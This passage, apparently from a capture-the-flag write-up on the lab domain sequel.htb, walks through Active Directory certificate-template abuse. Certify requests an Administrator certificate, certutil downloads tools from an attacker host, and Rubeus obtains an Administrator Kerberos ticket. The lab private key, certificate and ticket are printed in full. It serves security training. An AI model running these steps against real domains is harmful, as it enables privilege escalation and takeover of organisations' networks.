```

The flag means that the requesting user for the certificate, can request it for another user.

And `pkiextendedkeyusage` indicates that with the new `certificate`, a user could authenticate on the domain.

```c
pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
```

```c
$ sudo ntpdate -b -u dc.sequel.htb
2023-02-26 15:34:08.723740 (+0000) +2505.865381 +/- 0.025202 dc.sequel.htb 10.129.162.11 s1 no-leap
CLOCK: time stepped by 2505.865381
```

```c
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 10

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4295RWYTGwf8cl+04odvt41GXgG8+C0GEDwoOAO5Ijx4M5su
l4Z6cux2uM9BYZ1yLkVUIbDVC03bxFDU7UwBx5SZ/tygljRfdJx78CjZYMdHu6ws
PQHjXyFtuCkSm8pFVVOhWNmEHr/U4ZAXvRWTGn3ZlQ6GDLOIeczvDdd1Cy0NFFes
wrIz9ebTrK7xO4gcdw4SZrVstz8yQ3HfmGX78ZroklX+eBUnU2EC3nfQGm4rhte3
db2+1XhdImNjfvqnvb+WoE2opll53zf/mYCn8Vt7xOKDaZSZCxVo4D1vvqLymM66
nzwyYGf4xWUayeNu0Neg+tjtafrmMP2JRT5Y5QIDAQABAoIBAQDhTuF4mrJ6qOKx
+5Yag8lssQvwvRATW6cSFkZRl36kJ/t8RFNX0OUlTJQgaVF//pXKuOurpJ6pYCxC
w0DtA8sPiGs2TCLaKnAV+Z/ePtl6QnERvnLkzSYOa/Nh6W6B31PoP70rY/C69ZdT
DYg2zVS5fcs7GvQ5SPH+l8KKl9NfiReAEa65/OpaTPUw2sQdxumgrhJpW3ME6MtG
WcNd5T0ACIAs2s/eOKxkW7RPnCjJZglDjnUQGxzl8uLD+Uzg4qZeRwbfmQ0JqvRp
fxKZxUfOQApS+GadMvc7OTw1Lc4TafaIf3eQp1bSyeDSDJDhciGg3J0m3vq0BdAz
4Fj+/KdRAoGBAOl6tDCxc4kgqQNGqEPlEvvsy0vcOlUfaIUyZ6O9Yv0sVKiA9g85
u0fWyCfYb0+TdJBe5J0sSVOIOM3k93WjSG2ESElKoHXhInF5uHHALDemUNZuzrxq
qQ9SxL381QoOGJ3ase/ofOYDVj/alvvhpwrwcJsbQInpjAl+yn51E1VLAoGBAPlf
h2IXeewmK/pEThsgYNCTgSyfFn66CJxBtYuuLzmcq65XpO9536ChTH/QrHgdTiql
Y0HJUevTcJO1Pk/0BNh63kJQtWW8Vc/l+zlmmkmzP+wgTHz8Y+kOCSBt/a9TW4bn
keadU595oUyLzZ7H7CDtW8DrRCiQiNaR3TCzaJyPAoGAUGdCMFabzAhkS82EWsVD
cWBNblVr/S5wxxXhnQC2WytuCA1JL1sZRJcRnK8rPgMwrBsRrZK3ub16mmUUVv2h
Dp30atD5Sz75poxdWUbts0hiJEZKiZZNnApL2IV+NBVAovPSPSUaBff2Ns0nG5zM
8rZ0gOW0pwm3gPmZ8EyPGNsCgYEAgQ6EZSqbKbDTn7DL71QBZtB/0JUAslMa86s6
BnD99cX0P8USEfGz31C644ceSwd3lbCEPt6uq+qAX6Ez/3LdMx/beNyGFIG0s2Rl
cN59yNigo1ZP33tLRajC5mqmGJ9+RcIAiyYuyeDLrm7H2n3C4YOVsbDQVGIAv3M7
0uF2qVcCgYAQgRZUjeIITM/SQZrJf5mqkTFXqfOPfby4N+fKAZhplElICPP5V739
yzjgvJ/JzV5zt7DSbvBGOvVoylYqFh0otu+8eJo60k1bCtAiQQTMofjBnX72M8m2
/YqkfE4rAphsCjalmDIf/q78gSEVLTjykuw/J4+971SGXW5hcWH66Q==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAArePs5Mq1kFCAAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwMjI2MTQyMzQxWhcNMjUwMjI2
MTQzMzQxWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDjb3lFZhMbB/xyX7Tih2+3jUZe
Abz4LQYQPCg4A7kiPHgzmy6Xhnpy7Ha4z0FhnXIuRVQhsNULTdvEUNTtTAHHlJn+
3KCWNF90nHvwKNlgx0e7rCw9AeNfIW24KRKbykVVU6FY2YQev9ThkBe9FZMafdmV
DoYMs4h5zO8N13ULLQ0UV6zCsjP15tOsrvE7iBx3DhJmtWy3PzJDcd+YZfvxmuiS
Vf54FSdTYQLed9AabiuG17d1vb7VeF0iY2N++qe9v5agTaimWXnfN/+ZgKfxW3vE
4oNplJkLFWjgPW++ovKYzrqfPDJgZ/jFZRrJ427Q16D62O1p+uYw/YlFPljlAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFN1Dq5ZBmrDZxbw2Dw+nr1Q+MKVz
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAlczmWVJt8xCUzkPfU1EdHV3aahFwAXPgd0QqKzbG8Mk61Il7P9j0PM56
B4e9e4nswznbBtTPk7QH+c/gTJgo25BxF2LxjT2CfG7o9agQ6BtF4tGRaT9Y5mKi
mljdgonrgtR56jCdILUs7CE0LiJpOAR35Pqu5PtWpHLqmnlulTVz9UNYmDIg5Xf5
ro4sKKuofgyw6RuBysbQNx/6joNtRZQe2wSQeL7VGg5t9imPfRWfaZNLoVA/rOKb
8lIeWyDqi2gRNPtMrubAy0MoNk1iVH0Z3IXpawj+Hlkv/wQhiOfCX2AG/GA135uG
a1VLRAkYt3r1beOJxamQBYZjSLwILQ==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:13.6010088
```

```c
$ cat cert.pem 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4295RWYTGwf8cl+04odvt41GXgG8+C0GEDwoOAO5Ijx4M5su
l4Z6cux2uM9BYZ1yLkVUIbDVC03bxFDU7UwBx5SZ/tygljRfdJx78CjZYMdHu6ws
PQHjXyFtuCkSm8pFVVOhWNmEHr/U4ZAXvRWTGn3ZlQ6GDLOIeczvDdd1Cy0NFFes
wrIz9ebTrK7xO4gcdw4SZrVstz8yQ3HfmGX78ZroklX+eBUnU2EC3nfQGm4rhte3
db2+1XhdImNjfvqnvb+WoE2opll53zf/mYCn8Vt7xOKDaZSZCxVo4D1vvqLymM66
nzwyYGf4xWUayeNu0Neg+tjtafrmMP2JRT5Y5QIDAQABAoIBAQDhTuF4mrJ6qOKx
+5Yag8lssQvwvRATW6cSFkZRl36kJ/t8RFNX0OUlTJQgaVF//pXKuOurpJ6pYCxC
w0DtA8sPiGs2TCLaKnAV+Z/ePtl6QnERvnLkzSYOa/Nh6W6B31PoP70rY/C69ZdT
DYg2zVS5fcs7GvQ5SPH+l8KKl9NfiReAEa65/OpaTPUw2sQdxumgrhJpW3ME6MtG
WcNd5T0ACIAs2s/eOKxkW7RPnCjJZglDjnUQGxzl8uLD+Uzg4qZeRwbfmQ0JqvRp
fxKZxUfOQApS+GadMvc7OTw1Lc4TafaIf3eQp1bSyeDSDJDhciGg3J0m3vq0BdAz
4Fj+/KdRAoGBAOl6tDCxc4kgqQNGqEPlEvvsy0vcOlUfaIUyZ6O9Yv0sVKiA9g85
u0fWyCfYb0+TdJBe5J0sSVOIOM3k93WjSG2ESElKoHXhInF5uHHALDemUNZuzrxq
qQ9SxL381QoOGJ3ase/ofOYDVj/alvvhpwrwcJsbQInpjAl+yn51E1VLAoGBAPlf
h2IXeewmK/pEThsgYNCTgSyfFn66CJxBtYuuLzmcq65XpO9536ChTH/QrHgdTiql
Y0HJUevTcJO1Pk/0BNh63kJQtWW8Vc/l+zlmmkmzP+wgTHz8Y+kOCSBt/a9TW4bn
keadU595oUyLzZ7H7CDtW8DrRCiQiNaR3TCzaJyPAoGAUGdCMFabzAhkS82EWsVD
cWBNblVr/S5wxxXhnQC2WytuCA1JL1sZRJcRnK8rPgMwrBsRrZK3ub16mmUUVv2h
Dp30atD5Sz75poxdWUbts0hiJEZKiZZNnApL2IV+NBVAovPSPSUaBff2Ns0nG5zM
8rZ0gOW0pwm3gPmZ8EyPGNsCgYEAgQ6EZSqbKbDTn7DL71QBZtB/0JUAslMa86s6
BnD99cX0P8USEfGz31C644ceSwd3lbCEPt6uq+qAX6Ez/3LdMx/beNyGFIG0s2Rl
cN59yNigo1ZP33tLRajC5mqmGJ9+RcIAiyYuyeDLrm7H2n3C4YOVsbDQVGIAv3M7
0uF2qVcCgYAQgRZUjeIITM/SQZrJf5mqkTFXqfOPfby4N+fKAZhplElICPP5V739
yzjgvJ/JzV5zt7DSbvBGOvVoylYqFh0otu+8eJo60k1bCtAiQQTMofjBnX72M8m2
/YqkfE4rAphsCjalmDIf/q78gSEVLTjykuw/J4+971SGXW5hcWH66Q==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAArePs5Mq1kFCAAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwMjI2MTQyMzQxWhcNMjUwMjI2
MTQzMzQxWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDjb3lFZhMbB/xyX7Tih2+3jUZe
Abz4LQYQPCg4A7kiPHgzmy6Xhnpy7Ha4z0FhnXIuRVQhsNULTdvEUNTtTAHHlJn+
3KCWNF90nHvwKNlgx0e7rCw9AeNfIW24KRKbykVVU6FY2YQev9ThkBe9FZMafdmV
DoYMs4h5zO8N13ULLQ0UV6zCsjP15tOsrvE7iBx3DhJmtWy3PzJDcd+YZfvxmuiS
Vf54FSdTYQLed9AabiuG17d1vb7VeF0iY2N++qe9v5agTaimWXnfN/+ZgKfxW3vE
4oNplJkLFWjgPW++ovKYzrqfPDJgZ/jFZRrJ427Q16D62O1p+uYw/YlFPljlAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFN1Dq5ZBmrDZxbw2Dw+nr1Q+MKVz
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAlczmWVJt8xCUzkPfU1EdHV3aahFwAXPgd0QqKzbG8Mk61Il7P9j0PM56
B4e9e4nswznbBtTPk7QH+c/gTJgo25BxF2LxjT2CfG7o9agQ6BtF4tGRaT9Y5mKi
mljdgonrgtR56jCdILUs7CE0LiJpOAR35Pqu5PtWpHLqmnlulTVz9UNYmDIg5Xf5
ro4sKKuofgyw6RuBysbQNx/6joNtRZQe2wSQeL7VGg5t9imPfRWfaZNLoVA/rOKb
8lIeWyDqi2gRNPtMrubAy0MoNk1iVH0Z3IXpawj+Hlkv/wQhiOfCX2AG/GA135uG
a1VLRAkYt3r1beOJxamQBYZjSLwILQ==
-----END CERTIFICATE-----
```

```c
$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

Note: It is important to NOT set a password!

```c
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> certutil -urlcache -split -f "http://10.10.14.24/cert.pfx" cert.pfx
****  Online  ****
Enter PFX password:
================ Certificate 0 ================
================ Begin Nesting Level 1 ================
Element 0:
Serial Number: 1e0000000ade3ece4cab59050800000000000a
Issuer: CN=sequel-DC-CA, DC=sequel, DC=htb
 NotBefore: 2/26/2023 6:23 AM
 NotAfter: 2/26/2025 6:33 AM
Subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
Non-root Certificate
Template: UserAuthentication
Cert Hash(sha1): e381d47add695be611bcba60a8abd9b8a6517df5
----------------  End Nesting Level 1  ----------------
  Provider = Microsoft Enhanced Cryptographic Provider v1.0
AES256+RSAES_OAEP(RSA:??) test FAILED: Cannot find object or property. 0x80092004 (-2146885628 CRYPT_E_NOT_FOUND)
Encryption test passed
Signature test passed
================ Begin force NCrypt ================
  Provider = Microsoft Enhanced Cryptographic Provider v1.0
AES256+RSAES_OAEP(RSA:??) test FAILED: Cannot find object or property. 0x80092004 (-2146885628 CRYPT_E_NOT_FOUND)
Encryption test passed (CNG)
Signature test passed (CNG)
----------------  End force NCrypt  ----------------
CertUtil: -URLCache command completed successfully.
```

```c
$ wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
--2023-02-26 13:55:33--  https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/Rubeus.exe [following]
--2023-02-26 13:55:34--  https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/Rubeus.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 446976 (436K) [application/octet-stream]
Saving to: ‘Rubeus.exe’

Rubeus.exe                                                 100%[========================================================================================================================================>] 436.50K  1.12MB/s    in 0.4s    

2023-02-26 13:55:35 (1.12 MB/s) - ‘Rubeus.exe’ saved [446976/446976]
```

```c
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> certutil -urlcache -split -f "http://10.10.14.24/Rubeus.exe" Rubeus.exe
****  Online  ****
  000000  ...
  06d200
CertUtil: -URLCache command completed successfully.
```

```c
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /rc4

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::2948:6ea:7647:ce19%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  2/26/2023 7:04:27 AM
  EndTime                  :  2/26/2023 5:04:27 PM
  RenewTill                :  3/5/2023 7:04:27 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  LV2tvRz5xNzP4BJYe8u2rw==
  ASREP (key)              :  B728B0CE582397F1D1F145402FBFD0C4
```

```c
      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
```

> https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=ICAgICAgZG9JR1NEQ0NCa1NnQXdJQkJhRURBZ0VXb29JRlhqQ0NCVnBoZ2dWV01JSUZVcUFEQWdFRm9Rd2JDbE5GVVZWRlRDNUlWRUtpSHpBZG9BTUMKICAgICAgQVFLaEZqQVVHd1pyY21KMFozUWJDbk5sY1hWbGJDNW9kR0tqZ2dVYU1JSUZGcUFEQWdFU29RTUNBUUtpZ2dVSUJJSUZCRnMwMjVtNTdLZVkKICAgICAgL1FJMU9FaGlZRE1HeWdNWlA1RmsvL3J1THJpVmRxWlRjZU16a3N2aTFJWnJ0UkNwR2VFd1ZJQUxpOVdUVHFTN0VsOGZIeGtYS1RsNzJsOTQKICAgICAgL0JRb3k3QzlQRHUxSEl1QzdZZ096RndRdW41djZFemZ5ZDcxemxQbjhwb3ViSTh2cGhLbmhvUEt5QW9lMUR3VXg0Nko5OVdLUXhDdm5sdGEKICAgICAgclBkR0xXVXYza2JuaXpRWUtCSkdMSDVUR0VyRGF0R3pJdWlXUlUyWkg5OFRDb3ROQ2RpTkNzcTFJUnptQ1pzcXJWY0hHakUxaUxPWGFuSG4KICAgICAgeFI2R1JnelRLWHdYZDBCQ3h0T1Z5anBhQzkxS1dKOUdIYnBEVEsyTTZHblo2WFhzSjdUOUdpYVkwMjV2Z3BuUHF0cDUxVzhNWHJZTG